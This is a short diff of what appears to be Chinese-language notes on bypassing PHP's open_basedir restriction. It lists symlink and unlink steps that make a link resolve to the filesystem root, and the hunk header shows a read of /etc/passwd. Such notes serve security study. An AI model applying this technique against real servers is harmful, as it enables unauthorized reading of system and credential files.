@@ -111,7 +111,6 @@ string(926) "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/
 2. 在`/var/www/html`目录下创建链接`temp`到`a/b/c/d/e/f/g`
 3. `symlink('temp/../../../../../../','readfile');`等价于`symlink('a/b/c/d/e/f/g/../../../../../../','readfile');`
 4. `ini_set('open_basedir','/var/www/html:readfile/');`添加权限
-
 5. `unlink('temp');`然后`symlink('/var/www/html','temp');`等价于`symlink('/var/www/html/../../../../../../','readfile');`相当于`readfile`为根目录
 
 ## SplFileInfo::getRealPath或者realpath
